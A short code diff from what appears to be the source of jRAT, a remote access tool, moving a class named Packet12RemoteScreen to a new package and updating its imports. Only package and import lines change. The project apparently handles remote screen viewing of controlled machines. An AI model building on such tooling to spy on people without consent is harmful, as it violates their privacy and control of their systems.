@@ -1,7 +1,7 @@
-package jrat.client.packets.incoming;
+package jrat.module.screen;
 
 import jrat.client.Connection;
-import jrat.client.Screen;
+import jrat.client.packets.incoming.AbstractIncomingPacket;
 
 public class Packet12RemoteScreen extends AbstractIncomingPacket {
 	
